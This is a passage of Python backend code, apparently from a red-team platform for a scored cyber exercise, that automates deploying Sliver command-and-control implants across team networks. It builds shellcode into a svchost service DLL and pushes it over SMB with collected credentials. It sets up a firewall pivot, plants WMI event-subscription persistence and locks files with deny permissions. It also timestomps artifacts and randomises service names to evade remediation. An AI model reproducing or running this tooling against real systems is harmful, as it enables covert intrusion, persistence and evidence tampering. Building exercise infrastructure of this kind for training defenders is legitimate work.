            update_box_progress(task_id, f"team{team_num}_fw", "skipped",
                                error="no firewall box in inventory")
            continue

        pivot_set_id = str(uuid.uuid4())
        effective_pivot_port = config.PIVOT_LISTENER_PORT_BASE + team_num

        with Session(engine) as db:
            win_ips = [b.box_ip for b in db.execute(
                select(Boxes).where(Boxes.team_num == team_num, Boxes.os == "windows")
            ).scalars().all()]
            lin_ips = [b.box_ip for b in db.execute(
                select(Boxes).where(Boxes.team_num == team_num, Boxes.os == "linux")
            ).scalars().all()]

        # Generate sequentially — Go compile is ~5 min each; parallel risks OOM.
        with Session(engine) as db:
            # 1. pfSense gateway (mTLS session)
            build1 = await _generate_single_implant(
                client=client, nxc=nxc,
                goos="freebsd", goarch=gw_spec.arch, fmt_str=gw_spec.format or "exe",
                is_beacon=False,            # MUST be session — _maybe_setup_pivot fires on session-connected only
                beacon_interval=60,
                c2_url=mtls_url,
                deploy_ips=[fw_box.ip],
                db_session=db,
                pivot_gateway=True,
                pivot_set_id=pivot_set_id,
                tcp_pivot_port=effective_pivot_port,
                fallback_creds={fw_box.ip: (fw_box.username, fw_box.password)},
                apply_immutable=gw_spec.apply_immutable,
                immutable_scope=gw_spec.immutable_scope,
                # persistence_name: stored in ImplantBuilds.persistence_mechanism;
                # used by _find_matching_build dedup key and _auto_register_implant.
                persistence_name=gw_spec.persistence_name,
                # gateway_persistence_name: triggers the elif block that applies
                # DevdKqueue post-deploy (bypasses the standard pivot_gateway guard).
                gateway_persistence_name=gw_spec.persistence_name,
                # auto_register=True: the `elif pivot_gateway and
                # gateway_persistence_name` block registers the gateway row
                # (recording its pool params). The _maybe_setup_pivot /
                # _auto_register_implant path on session-connected is the backstop,
                # and dedups against this row rather than adding a second one.
                auto_register=True,
                auto_register_ioc_name=gateway_ioc.name,
                actor_username=actor_username,
            )
            # PLAN Phase 2b: _generate_single_implant now returns pending_writes;
            # apply via the single-writer actor rather than committing the outer
            # read Session.
            _pw = build1.pop("pending_writes", None) if isinstance(build1, dict) else None

            if _pw:

                await write_actor.submit(

                    lambda adb, _p=_pw: _apply_generate_pending_writes(adb, _p),

                    label="pivot_ioc_gateway_persist",

                )
            for r in build1.get("deploy_results", []):
                update_box_progress(task_id, r["host"],
                                    "done" if r["success"] else "failed",
                                    error=r.get("error"))
            # Timestomp gateway artifacts (§2.3).
            for r in build1.get("deploy_results", []):
                if r["success"] and gateway_ioc.timestomp and gateway_ioc.timestomp_paths:
                    from fastapi_backend.c2.timestomp import (
                        stomp_files_safe,  # cycle-break
                    )
                    await stomp_files_safe(r["host"], gateway_ioc.timestomp_paths, "freebsd", db)

            pivot_url = f"tcppivot://{fw_box.ip}:{effective_pivot_port}"

            # 2. Windows TCP-pivot SESSION — shellcode injected via winlansvc.dll svchost DLL
            #
            # is_beacon=False is REQUIRED, not a preference. Sliver's pivots "can
            # only be used in 'session mode'" (BishopFox/sliver wiki, Pivots), and
            # every pivot message in the protocol is session-keyed
            # (PivotPeerEnvelope.PivotSessionID, PivotGraphEntry.Session — there is
            # no beacon equivalent). A beacon built against tcppivot:// fails
            # SILENTLY AND EXPENSIVELY: it never opens a socket and busy-loops at
            # ~99% CPU on the target indefinitely. Measured 2026-08-09: 10 members
            # built this way, 0 ever registered, while an otherwise identical
            # session over the same pivot URL connected immediately.
            if win_spec and win_ips:
                import shutil as _shutil

                # 2a. Generate Sliver shellcode with TCP-pivot URL.
                try:
                    sc_bytes = await _generate_inject_shellcode(
                        pivot_url,
                        beacon_interval_s=win_spec.beacon_interval,
                        beacon_jitter_s=win_spec.jitter or 20,
                        is_beacon=False,
                    )
                except RuntimeError as exc:
                    logger.error("_generate_pivot_ioc_set: shellcode gen failed team %d: %s", team_num, exc)
                    for win_ip in win_ips:
                        update_box_progress(task_id, win_ip, "failed", error=f"shellcode gen: {exc}")
                else:
                    # 2b. Write shellcode.h and cross-compile winlansvc.dll (one DLL per team).
                    build_dir = Path(tempfile.mkdtemp(prefix="c3r_winlansvc_"))
                    dll_path  = build_dir / f"winlansvc_team{team_num}.dll"
                    try:
                        await asyncio.to_thread(_make_shellcode_header, sc_bytes, build_dir)
                        await asyncio.to_thread(_compile_winlansvc, build_dir, dll_path)
                    except Exception as exc:
                        logger.error("_generate_pivot_ioc_set: winlansvc compile failed team %d: %s", team_num, exc)
                        for win_ip in win_ips:
                            update_box_progress(task_id, win_ip, "failed", error=f"compile: {exc}")
                    else:
                        # 2c. Upload DLL + run deploy script for each Windows box.
                        # Build dir cleanup in finally — guards against exceptions in per-box loops.
                        dll_deployed_ips: set[str] = set()
                        # Per-box resolved deploy_params (pooled SVC_NAME + BACKUP_DIR). The
                        # WMI persistence loop (2e) below reuses these so the subscription
                        # objects it plants carry the SAME pooled name the DLL service used.
                        pivot_deploy_params: dict[str, dict[str, str]] = {}
                        # box_ip -> DeployedIOCs.id, so the LATER persistence loop can mark
                        # the row deploy_failed (it runs in a separate pass, where the
                        # registration id from the DLL loop is out of scope).
                        pivot_reg_ids: dict[str, int] = {}
                        try:
                            for win_ip in win_ips:
                                # include_invalid: the background revalidation loop
                                # transiently flips creds to valid=False under full
                                # load, and without the fallback this box is skipped
                                # with no DeployedIOCs row -- the intermittent
                                # "auto-register did not fire" pivot failure, which
                                # always landed on a Windows box because these loops
                                # are Windows-only.
                                cred = _get_best_cred(win_ip, db, protocol="smb",
                                                      include_invalid=True,
                                                      scoring_only=config.RED_SCORING_ENABLED)
                                if cred is None:
                                    update_box_progress(task_id, win_ip, "failed", error="no smb credentials")
                                    continue

                                # Pool the service NAME per box (docs/PLAN_build_check_deploy_name_pools.md
                                # §13). SVC_NAME drives the service, svchost group key, WMI subscription
                                # names, and the DLL filename — so a fixed off-pool name (the old
                                # 'WinLanSvc' default) collided fleet-wide and evaded pool-aware
                                # remediation. The deploy script now fails loud without C3R_SVC_NAME,
                                # so an unresolved name must fail the box, not fall back.
                                _params = await _resolve_implant_pool_params(
                                    box_ip=win_ip, box_os="windows",
                                    ioc_name=windows_ioc.name, deploy_dir="",
                                )
                                _svc = _params.get("SVC_NAME")
                                if not _svc:
                                    update_box_progress(task_id, win_ip, "failed",
                                                        error="service name pool exhausted for windows_implant_inject")
                                    continue
                                # DLL filename derives from the pooled name (deploy script uses
                                # $SVC_NAME.ToLower() + '.dll' under System32).
                                _dll_leaf = f"{_svc.lower()}.dll"
                                _dll_rel = rf"\Windows\System32\{_dll_leaf}"
                                _dll_abs = rf"C:\Windows\System32\{_dll_leaf}"
                                # C3R_* env injected into deploy + WMI scripts. C3R_BINARY is the
                                # on-box DLL path the WMI backup-staging step copies from.
                                _env = {f"C3R_{k}": v for k, v in _params.items()}
                                _env["C3R_BINARY"] = _dll_abs
                                pivot_deploy_params[win_ip] = _params

                                # Register BEFORE the first on-box write
                                # (docs/PLAN_failed_deploy_redeploy.md, D2). The row has to
                                # exist — carrying these pooled names — even when a leg fails,
                                # or a half-planted artifact is named with values nothing
                                # recorded and check/remediate/scrub can never find it. It also
                                # gives the failure path something to mark deploy_failed and the
                                # operator something to redeploy under the SAME names.
                                _win_reg_id = await _auto_register_deployed_ioc(
                                    box_ip=win_ip,
                                    ioc_name=windows_ioc.name,
                                    persistence_name=win_spec.persistence_name if win_spec else None,
                                    implant_identifier=None,
                                    deployed_by=actor_username,
                                    deploy_params=_params,
                                )
                                if _win_reg_id:
                                    pivot_reg_ids[win_ip] = _win_reg_id

                                def _fail_win(msg: str, _rid: int | None = _win_reg_id,
                                              _ip: str = win_ip) -> None:
                                    """Mark the box failed on the task AND the row unscoreable."""
                                    update_box_progress(task_id, _ip, "failed", error=msg)
                                    if _rid:
                                        # NB: no db= — this pivot `db` is a plain event-loop
                                        # Session, NOT an actor transaction. Passing it made
                                        # mark_deploy_failed mutate a non-actor session whose
                                        # pending deployed_iocs UPDATE then autoflushed on the
                                        # next _get_best_cred read (single-writer violation that
                                        # blocked the loop on the 30s busy_timeout). Route the
                                        # transition through the actor instead.
                                        mark_deploy_failed(_rid, msg, task_id=task_id)

                                # put_file: binary deploy — wrapper cache not used for binary uploads.
                                # SMB put_file writes relative to the C$ share, so the path must be
                                # share-relative (\Windows\...) — a "C:\" drive prefix yields
                                # STATUS_OBJECT_NAME_INVALID (0xc0000033).
                                put_result = await nxc.put_file_cred(  # nxc-wrapper-bypass: binary-deploy
                                    win_ip, "smb", cred, str(dll_path), _dll_rel,
                                )
                                if not put_result.success:
                                    _fail_win(f"put_file {_dll_leaf}: {put_result.output}")
                                    continue

                                # 2c-pre. Timestomp BEFORE deploy script — deploy script applies
                                # icacls /deny Everyone:(W,D,DE,DC) which blocks SetFileTime.
                                if windows_ioc and windows_ioc.timestomp:
                                    from fastapi_backend.c2.timestomp import (
                                        stomp_files_safe,  # cycle-break
                                    )
                                    await stomp_files_safe(win_ip, [_dll_abs], "windows", db)

                                # Deploy script: register service, sc start, apply immutability.
                                # Delivered via put_file + `powershell.exe -File`, NOT inline
                                # -EncodedCommand: this script is 8159 chars single-encoded and
                                # execute_cred(powershell=True) would re-encode it to ~21.8k, over
                                # nxc's 8191 cap -> silent rc=0 no-op (service + immutability never
                                # applied). See _deploy_ps_via_file.
                                _ok, _st, _out = await _deploy_ps_via_file(
                                    nxc, win_ip, cred,
                                    "iocs/deploy_scripts/windows/win_inject_svc_deploy.ps1",
                                    _env, db=db,
                                )
                                if not _ok:
                                    _fail_win(f"deploy script (status={_st}): {_out[:300]}")
                                    continue

                                update_box_progress(task_id, win_ip, "done")
                                dll_deployed_ips.add(win_ip)

                                # (Registration already happened above, BEFORE the first on-box
                                # write, so a failed leg still leaves a row carrying these pooled
                                # names — see the _auto_register_deployed_ioc call there.)

                                # 2c-bis. Stage the backup copy from the LOCAL dll artifact,
                                # exactly as the linux/gateway members do via
                                # _stage_backup_for_deploy. It must NOT be staged on-box by the
                                # deploy scripts: win_inject_svc_deploy.ps1 applies
                                # `icacls /deny 'Everyone:(W,D,DE,DC)'` to the DLL, so any on-box
                                # copy ordered after it fails "Access to the path ... is denied."
                                # That is exactly what win_inject_wmi_deploy.ps1's staging block
                                # did — it runs later (2e) and threw, reporting a whole-box deploy
                                # failure for a box whose DLL, service and subscription had all
                                # landed (own_done=0 on teams 6/8/9, 2026-08-10). Uploading from
                                # the local artifact never reads the protected file at all.
                                if _params.get("BACKUP_DIR") and dll_path.exists():
                                    await _stage_backup_for_deploy(
                                        box_ip=win_ip, box_os="windows", is_windows=True,
                                        binary_path=dll_path, filename=_svc,
                                        nxc=nxc,
                                        timestomp=bool(windows_ioc.timestomp),
                                        deployed_ioc_id=_win_reg_id,
                                        ioc_name=windows_ioc.name,
                                        task_id=task_id,
                                    )

                            # 2e. WMI persistence deploy — separate NXC call per box. Only for
                            # boxes whose DLL service actually landed (2c) — a WMI failure here
                            # means the IOC's documented artifacts (EventFilter,
                            # CommandLineEventConsumer, __FilterToConsumerBinding) never land,
                            # and the shipped check_script won't report status=1 (F1 — see
                            # PLAN_implant_persistence_deploy.md §7.1). Mark the box failed
                            # instead of silently leaving it "done".
                            # A box whose DLL deploy failed never enters
                            # dll_deployed_ips and so never reaches the WMI step at
                            # all. Say so explicitly — otherwise a missing
                            # subscription looks identical to one the WMI step tried
                            # and failed to plant.
                            _skipped_wmi = [i for i in win_ips if i not in dll_deployed_ips]
                            if _skipped_wmi:
                                logger.warning(
                                    "pivot WMI persistence SKIPPED for %s — DLL deploy "
                                    "did not succeed on those boxes", _skipped_wmi,
                                )
                            for win_ip in dll_deployed_ips:
                                # include_invalid: see the SVC_NAME loop above -- a
                                # transiently-invalid cred here silently drops WMI
                                # persistence for the box.
                                cred = _get_best_cred(win_ip, db, protocol="smb",
                                                      include_invalid=True,
                                                      scoring_only=config.RED_SCORING_ENABLED)
                                if cred is None:
                                    update_box_progress(task_id, win_ip, "failed",
                                                        error="WMI persistence: no smb credentials")
                                    continue
                                # Re-inject the SAME pooled name resolved in 2c so the WMI
                                # EventFilter/Consumer/backup carry the box's SVC_NAME (the
                                # deploy script fails loud without C3R_SVC_NAME).
                                _wparams = pivot_deploy_params.get(win_ip, {})
                                _wenv = {f"C3R_{k}": v for k, v in _wparams.items()}
                                _wsvc = _wparams.get("SVC_NAME")
                                if _wsvc:
                                    _wenv["C3R_BINARY"] = rf"C:\Windows\System32\{_wsvc.lower()}.dll"
                                # Delivered via put_file + `powershell.exe -File`, NOT inline
                                # -EncodedCommand: 8071 chars single-encoded -> ~21.6k when
                                # execute_cred(powershell=True) re-encodes it, over nxc's 8191
                                # cap -> silent rc=0 no-op. That made every pivot box's WMI
                                # subscription silently absent while "planted" was logged (rc=0
                                # is not the same as the script running). _ok also gates on the
                                # script's own {"status":1} JSON, not just rc: the script always
                                # exit 0, so a caught WMI-Put error would otherwise still read
                                # "planted". See _deploy_ps_via_file.
                                _wok, _wst, _wout = await _deploy_ps_via_file(
                                    nxc, win_ip, cred,
                                    "iocs/deploy_scripts/windows/persistence/win_inject_wmi_deploy.ps1",
                                    _wenv, db=db,
                                )
                                # Log the outcome SERVER-SIDE, both ways. This step's
                                # only record used to be update_box_progress -> the task
                                # row in a per-worker DB that is deleted with the run, so
                                # "the subscription is missing and nothing says why" was
                                # unfalsifiable from the logs. It cost three wrong
                                # hypotheses (2026-08-09/10). Success is logged too:
                                # otherwise absence still cannot distinguish "failed" from
                                # "never reached this line".
                                if not _wok:
                                    logger.warning(
                                        "pivot WMI persistence FAILED on %s (svc=%s wmi=%s status=%s): %s",
                                        win_ip, _wsvc, _wenv.get("C3R_WMI_NAME"), _wst,
                                        _wout[:400],
                                    )
                                    _werr = f"WMI persistence (status={_wst}): {_wout[:300]}"
                                    update_box_progress(task_id, win_ip, "failed", error=_werr)
                                    # The row was registered by the DLL leg and is ACTIVE, so
                                    # without this it keeps scoring: a persistence mechanism
                                    # that never landed reads to the check pipeline exactly
                                    # like one blue remediated, paying partial points (16 of 40
                                    # on an Ultra IOC) for an artifact red never planted.
                                    # docs/PLAN_failed_deploy_redeploy.md.
                                    _wrid = pivot_reg_ids.get(win_ip)
                                    if _wrid:
                                        # no db= — see the SVC_NAME loop above: the pivot `db`
                                        # is a plain event-loop Session; route through the actor.
                                        mark_deploy_failed(_wrid, _werr, task_id=task_id)
                                else:
                                    logger.info(
                                        "pivot WMI persistence planted on %s (svc=%s wmi=%s)",
                                        win_ip, _wsvc, _wenv.get("C3R_WMI_NAME"),
                                    )

                        finally:
                            # Always clean up temp build dir.
                            await asyncio.to_thread(_shutil.rmtree, str(build_dir), True)

            # 3. Linux TCP-pivot SESSION — is_beacon=False is required, not chosen;
            # see the note on the Windows member above (Sliver pivots are
            # session-only; a tcppivot beacon busy-loops at ~99% CPU and never
            # connects).
            if lin_spec and lin_ips:
                build3 = await _generate_single_implant(
                    client=client, nxc=nxc,
                    goos="linux", goarch=lin_spec.arch, fmt_str="exe",
                    is_beacon=False,
                    beacon_interval=lin_spec.beacon_interval,
                    beacon_jitter=lin_spec.jitter,
                    c2_url=pivot_url,
                    deploy_ips=lin_ips,
                    db_session=db,
                    pivot_gateway=False,
                    pivot_set_id=pivot_set_id,
                    tcp_pivot_port=None,
                    persistence_name=lin_spec.persistence_name,
                    persistence_tier_group=lin_spec.persistence_name,
                    apply_immutable=lin_spec.apply_immutable,
                    immutable_scope=lin_spec.immutable_scope,
                    auto_register=True,
                    auto_register_ioc_name=linux_ioc.name,
                    actor_username=actor_username,
                )
                _pw = build3.pop("pending_writes", None) if isinstance(build3, dict) else None

                if _pw:

                    await write_actor.submit(

                        lambda adb, _p=_pw: _apply_generate_pending_writes(adb, _p),

                        label="pivot_ioc_linux_persist",

                    )
                for r in build3.get("deploy_results", []):
                    update_box_progress(task_id, r["host"],
                                        "done" if r["success"] else "failed",
                                        error=r.get("error"))
                # Timestomp Linux artifacts (§3.3).
                for r in build3.get("deploy_results", []):
                    if r["success"] and linux_ioc and linux_ioc.timestomp and linux_ioc.timestomp_paths:
                        from fastapi_backend.c2.timestomp import (
                            stomp_files_safe,  # cycle-break
                        )
                        await stomp_files_safe(r["host"], linux_ioc.timestomp_paths, "linux", db)


def _make_shellcode_header(sc_bytes: bytes, build_dir: "Path") -> None:
    """Write shellcode.h into build_dir for winlansvc.c compilation."""
    lines = [
        "static unsigned char sc[] = {",
        ", ".join(f"0x{b:02x}" for b in sc_bytes),
        f"}};\nstatic unsigned int sc_len = {len(sc_bytes)};",
    ]
    (build_dir / "shellcode.h").write_text("\n".join(lines))


def _compile_winlansvc(build_dir: "Path", out_path: "Path") -> None:
    """Cross-compile winlansvc.c against shellcode.h in build_dir."""
    import subprocess as _subprocess
    src = config.PROJECT_ROOT / "implant_src" / "win_inject_svc" / "winlansvc.c"
    _subprocess.run(
        ["x86_64-w64-mingw32-gcc", "-shared", "-O2",
         str(src), "-o", str(out_path),
         f"-I{build_dir}",
         "-ladvapi32", "-lkernel32"],
        check=True, capture_output=True,
    )


def _find_matching_build(
    db: Session,
    goos: str,
    goarch: str,
    fmt_str: str,
    implant_type: str,
    c2_url: str,
    persistence_mechanism: str | None,
    pivot_gateway: bool = False,
    known_sliver_names: "set[str] | None" = None,
) -> "ImplantBuilds | None":
    """Return the most recent ImplantBuilds row whose binary still exists on disk and whose
    compile parameters match exactly.  Used to skip recompilation when an equivalent build
    was already produced (e.g. pfSense mTLS implant shared across all teams, or a retry
    of the same deploy-all run).

    ``pivot_gateway`` is part of the key: a pivot-gateway generate must never reuse a
    plain (non-gateway) build that happens to share os/arch/c2_url, and vice versa.
    They differ in deploy-time semantics (tcp_pivot_port, _maybe_setup_pivot lookup)
    even when the compiled binary is identical, so cross-matching silently drops the
    explicit pivot port and breaks pivot setup.

    ``known_sliver_names``: when provided (the set of implant names the Sliver server
    currently knows), reject a candidate whose filename stem is absent — it means
    clean_stale_implants.sh pruned the implant_config and the binary is DOA.
    """
    stmt = (
        select(ImplantBuilds)
        .where(
            ImplantBuilds.os == goos,
            ImplantBuilds.arch == goarch,
            ImplantBuilds.format == fmt_str,
            ImplantBuilds.implant_type == implant_type,
            ImplantBuilds.c2_url == c2_url,
            ImplantBuilds.persistence_mechanism == persistence_mechanism,
            ImplantBuilds.pivot_gateway == pivot_gateway,
        )
        .order_by(ImplantBuilds.created_at.desc())
        .limit(1)
    )
    row = db.execute(stmt).scalar_one_or_none()
    if row is None:
        # Fallback: migrate_implant_builds() may have raced the generate call and
        # inserted a row with c2_url='unknown' before the real commit arrived.
        # Match on everything except c2_url so a retry can reuse the existing binary
        # and issue an UPDATE rather than a failing INSERT.
        fallback_stmt = (
            select(ImplantBuilds)
            .where(
                ImplantBuilds.os == goos,
                ImplantBuilds.arch == goarch,
                ImplantBuilds.format == fmt_str,
                ImplantBuilds.implant_type == implant_type,
                ImplantBuilds.c2_url == "unknown",
                ImplantBuilds.persistence_mechanism == persistence_mechanism,
                ImplantBuilds.pivot_gateway == pivot_gateway,
            )
            .order_by(ImplantBuilds.created_at.desc())
            .limit(1)
        )
        row = db.execute(fallback_stmt).scalar_one_or_none()
    if row is None:
        return None
    if not (Path(config.IMPLANT_STORE_DIR) / row.id / row.filename).exists():
        return None
    # Staleness gate keys on the bare Sliver codename (row.sliver_name), the only
    # identifier that appears in Sliver's implant_builds() list — the composite
    # filename stem never matches. Fail-open when the codename is unknown (disk-
    # synced rows) so a valid build is never rejected as a false positive.
    if known_sliver_names is not None and row.sliver_name and row.sliver_name not in known_sliver_names:
        logger.warning(
            "_find_matching_build: build %s (sliver=%s, file=%s) absent from Sliver "
            "known builds — implant_config was pruned; forcing recompile",
            row.id, row.sliver_name, row.filename,
        )
        return None
    return row


async def _generate_single_implant(
    client: Any,
    nxc: "NXCWrapper",
    goos: str,
    goarch: str,
    fmt_str: str,
    is_beacon: bool,
    beacon_interval: int,
    c2_url: str,
    deploy_ips: list[str],
    db_session: Session,
    pivot_gateway: bool = False,
    beacon_jitter: int = 0,              # explicit jitter seconds; 0 → half-interval
    pivot_set_id: str | None = None,
    tcp_pivot_port: int | None = None,
    fallback_creds: dict[str, tuple[str, str]] | None = None,
    # ── Composable persistence + immutability (Phase A) ──────────────
    persistence_tier_group: str | None = None,
    apply_immutable: bool = False,
    immutable_scope: str = "binary_only",
    auto_register: bool = False,
    auto_register_ioc_name: str | None = None,
    actor_username: str = "system",
    persistence_name: str | None = None,
    gateway_persistence_name: str | None = None,  # applies persistence to gateway even when pivot_gateway=True
    task_id: int | None = None,  # OperatorTask to publish compile queue position/phase to
    computed_difficulty: int | None = None,  # Generate-page auto-difficulty override for auto-registered DeployedIOCs
) -> dict:
    """Generate one implant binary and optionally deploy it. Returns the build record dict."""
    implant_type = "beacon" if is_beacon else "session"
    fmt_int = _IMPLANT_FORMAT_MAP.get(fmt_str, 0)

    # Dedup: reuse an existing build with identical compile params rather than
    # hitting Sliver again.  Avoids redundant compiles (e.g. pfSense mTLS ELF
    # shared across all teams) and prevents UNIQUE constraint violations on retry.
    # Validate against Sliver's live build list: clean_stale_implants.sh prunes
    # implant_configs from sliver.db on a 1-day threshold; a backend row whose
    # Sliver-side config was pruned produces a DOA binary the server rejects.
    _sliver_names = await _sliver_known_build_names()
    _existing = _find_matching_build(
        db_session, goos, goarch, fmt_str, implant_type, c2_url, persistence_name,
        pivot_gateway=pivot_gateway, known_sliver_names=_sliver_names,
    )
    if _existing:
        implant_id = _existing.id
        filename = _existing.filename
        # Preserve the reused build's sliver_name — it's what the running Sliver
        # implant reports as its session Name and what SliverCheck's is_implant_active
        # matches on. Setting None here (as this branch did until 2026-09-12) meant
        # every reused-build deploy path recorded implant_identifier=NULL on the new
        # DeployedIOCs row, and the preflight/check pipeline then failed those rows
        # with "No implant_identifier set for SliverCheck IOC". The fresh-build branch
        # below correctly parses sliver_name from the Sliver Generate response;
        # this branch needs the same value from the persisted implant_builds row.
        sliver_name = _existing.sliver_name
        binary_path = Path(config.IMPLANT_STORE_DIR) / implant_id / filename
        logger.info(
            "_generate_single_implant: reusing build %s sliver=%s (%s/%s/%s c2=%s)",
            implant_id, sliver_name, goos, goarch, fmt_str, c2_url,
        )
    else:
        # Routing: linux/amd64 SHARED_LIB → external builder (see _bg_generate
        # for the rationale — glibc-2.34-tainted native .so vs. container's
        # glibc-2.27 build).
        _external_builder = _external_builder_for(goos, fmt_str)
        if _external_builder:
            req_bytes = _build_external_generate_req_bytes(
                builder_name=_external_builder,
                goos=goos, goarch=goarch, fmt=fmt_int,
                is_beacon=is_beacon,
                beacon_interval_ns=beacon_interval * 1_000_000_000,
                beacon_jitter_ns=(beacon_jitter if beacon_jitter > 0 else beacon_interval // 2) * 1_000_000_000,
                c2_url=c2_url,
                is_shared_lib=(fmt_str == "shared"),
                exports=["RunSliver"] if fmt_str == "shared" else None,
            )
            generate_raw = client._channel.unary_unary(
                "/rpcpb.SliverRPC/GenerateExternal",
                request_serializer=lambda x: x,
                response_deserializer=lambda x: x,
            )
        else:
            req_bytes = _build_generate_req_bytes(
                goos=goos, goarch=goarch, fmt=fmt_int,
                is_beacon=is_beacon,
                beacon_interval_ns=beacon_interval * 1_000_000_000,
                beacon_jitter_ns=(beacon_jitter if beacon_jitter > 0 else beacon_interval // 2) * 1_000_000_000,
                c2_url=c2_url,
            )
            generate_raw = client._channel.unary_unary(
                "/rpcpb.SliverRPC/Generate",
                request_serializer=lambda x: x,
                response_deserializer=lambda x: x,
            )
        def _pivot_on_enqueue(position: int, _tid: int | None = task_id) -> None:
            if _tid is not None:
                set_phase(_tid, "queued")
                update_task_metadata(_tid, {"queue_position": position})

        def _pivot_on_acquire(_tid: int | None = task_id) -> None:
            if _tid is not None:
                set_phase(_tid, "compiling")

        try:
            response_bytes, _queue_position = await _serialized_sliver_compile(
                generate_raw, req_bytes,
                on_enqueue=_pivot_on_enqueue, on_acquire=_pivot_on_acquire,
            )
        except TimeoutError:
            raise HTTPException(status_code=504, detail="Implant generation timed out (>12 min)") from None
        except grpc.aio.AioRpcError as exc:
            raise HTTPException(status_code=503, detail=f"Sliver gRPC error during generate: {exc.details()}") from None

        if _external_builder:
            # See _bg_generate for the same two-step external-build flow.
            _build_id, sliver_name = _parse_external_config_response(response_bytes)
            logger.info(
                "_generate_single_implant: external build dispatched to %s "
                "sliver=%s build_id=%s (awaiting compile)",
                _external_builder, sliver_name, _build_id,
            )
            try:
                binary_data = await _await_external_build_bytes(
                    client, sliver_name, timeout_s=600,
                )
            except TimeoutError as exc:
                raise HTTPException(status_code=504, detail=str(exc)) from None
        else:
            sliver_name, binary_data = _parse_generate_response(response_bytes)

        implant_id = str(uuid.uuid4())
        ext = "exe" if goos == "windows" else "elf"
        clean = Path(sliver_name).stem if sliver_name else ""
        filename = (
            f"{clean}_{implant_type}_{goos}_{goarch}.{ext}" if clean
            else f"{implant_type}_{goos}_{goarch}.{ext}"
        )

        store_dir = Path(config.IMPLANT_STORE_DIR) / implant_id
        store_dir.mkdir(parents=True, exist_ok=True)
        binary_path = store_dir / filename
        binary_path.write_bytes(binary_data)
        binary_path.chmod(0o755)

    deploy_results: list[dict] = []
    if deploy_ips and nxc:
        tasks = []
        for ip in deploy_ips:
            box = query_one(db_session, Boxes, box_ip=ip)
            is_win = "windows" in (box.os or "").lower() if box else (goos == "windows")
            # Pivot-set implant/persistence deploy — same red_scoring routing as
            # the main path (docs/PLAN_implant_deploy_live_fire_fixes.md A).
            # include_invalid: the revalidation loop can transiently mark this
            # box's cred invalid under load; without the fallback the deploy
            # fails "No credentials" and no DeployedIOCs row is ever written.
            cred = _get_best_cred(
                ip, db_session, protocol="smb" if is_win else "ssh",
                include_invalid=True,
                scoring_only=config.RED_SCORING_ENABLED,
            )
            if cred:
                tasks.append((ip, cred.username, cred.password, is_win))
            elif fallback_creds and ip in fallback_creds:
                u, p = fallback_creds[ip]
                is_win = "windows" in (box.os or "").lower() if box else (goos == "windows")
                tasks.append((ip, u, p, is_win))
            else:
                deploy_results.append({"host": ip, "success": False, "error": "No credentials"})

        _difficulty = _resolve_ioc_difficulty(auto_register_ioc_name)
        gathered = await asyncio.gather(*[
            _deploy_one_implant(nxc, binary_path, filename, ip, u, p, w, goos=goos,
                                avoid_tmpfs=apply_immutable, difficulty=_difficulty)
            for ip, u, p, w in tasks
        ])
        deploy_results.extend(gathered)

        # ── Pivot post-deploy hook: persistence (resolved per-OS via
        # tier_group), immutable, auto-register.  Skipped on the
        # pivot_gateway (pfSense) since pivot test infra owns it; only
        # applied on internal Windows + Linux boxes.
        if not pivot_gateway and persistence_tier_group:
            from iocs.persistence import by_tier_group as _by_tier_group  # lazy-load
            pm = _by_tier_group(persistence_tier_group, goos)
            persistence_attr_for_target: str | None = None
            if pm:
                # Find the module-attr name corresponding to this mechanism.
                from iocs import persistence as _p  # lazy-load
                for _attr, _val in vars(_p).items():
                    if _val is pm:
                        persistence_attr_for_target = _attr
                        break
            cred_lookup = {ip: (u, p, w) for ip, u, p, w in tasks}
            for r in gathered:
                if not r["success"]:
                    continue
                ip = r["host"]
                if ip not in cred_lookup:
                    continue
                u, p, w = cred_lookup[ip]
                box_os = "windows" if w else goos
                deploy_dir = r.get("path") or ""
                sep = "\\" if w else "/"
                binary_remote = f"{deploy_dir.rstrip(sep)}{sep}{r['filename']}" if deploy_dir else r["filename"]
                # Same pool-driven params the main generate path records — the
                # pivot-set path recorded none, so pooled-name IOCs deployed under
                # their hardcoded default while check/remediate injected the pooled
                # name, and backup_copy IOCs got no BACKUP_DIR (Bucket G).
                pool_params = await _resolve_implant_pool_params(
                    box_ip=ip, box_os=box_os,
                    ioc_name=auto_register_ioc_name,
                    deploy_dir=deploy_dir,
                )
                hook = await _apply_persistence_post_deploy(
                    nxc=nxc, box_ip=ip, box_os=box_os,
                    username=u, password=p,
                    binary_remote_path=binary_remote,
                    persistence_attr_name=persistence_attr_for_target,
                    apply_immutable=apply_immutable,
                    immutable_scope=immutable_scope,
                    deploy_params=pool_params or None,
                )
                r.update(hook)
                # F1: persistence failure → this box's implant is not fully
                # deployed; drop success so the pivot deploy accounting
                # (failed / successful_ips below) and any caller see the miss.
                perr = persistence_step_failed(
                    hook, requested=bool(persistence_attr_for_target) or apply_immutable,
                )
                if perr:
                    r["success"] = False
                    r["error"] = f"persistence: {perr}"
                    if not hook.get("persistence_applied"):
                        continue  # skip auto-register only if persistence itself failed
                if auto_register and persistence_attr_for_target:
                    deployed_ioc_id = await _auto_register_deployed_ioc(
                        box_ip=ip,
                        ioc_name=auto_register_ioc_name,
                        persistence_name=persistence_attr_for_target,
                        implant_identifier=sliver_name or None,
                        deployed_by=actor_username,
                        deploy_params=pool_params or None,
                        computed_difficulty=computed_difficulty,
                    )
                    if deployed_ioc_id:
                        r["deployed_ioc_id"] = deployed_ioc_id
                    if pool_params.get("BACKUP_DIR") and binary_path.exists():
                        _bc = await _stage_backup_for_deploy(
                            box_ip=ip, box_os=box_os, is_windows=w,
                            binary_path=binary_path, filename=r["filename"],
                            nxc=nxc,
                            timestomp=_resolve_ioc_flag(auto_register_ioc_name, "timestomp"),
                            deployed_ioc_id=deployed_ioc_id,
                            ioc_name=auto_register_ioc_name,
                        )
                        if _bc:
                            r["backup_copy_path"] = _bc

        elif pivot_gateway and gateway_persistence_name:
            # Apply DevdKqueue (or any named mechanism) to the pfSense gateway.
            # tasks: list of (ip, u, p, is_win) — pfSense IP added via fallback_creds
            # path above (lines 2864–2867), so it IS in tasks.
            cred_lookup_gw = {ip: (u, p) for ip, u, p, _w in tasks}
            for r in gathered:
                if not r["success"]:
                    continue
                ip = r["host"]
                u, p = cred_lookup_gw.get(ip, (None, None))
                if u is None:
                    continue
                deploy_dir = r.get("path") or ""
                binary_remote = f"{deploy_dir.rstrip('/')}/{r['filename']}" if deploy_dir else r["filename"]
                gw_pool_params = await _resolve_implant_pool_params(
                    box_ip=ip, box_os=goos,
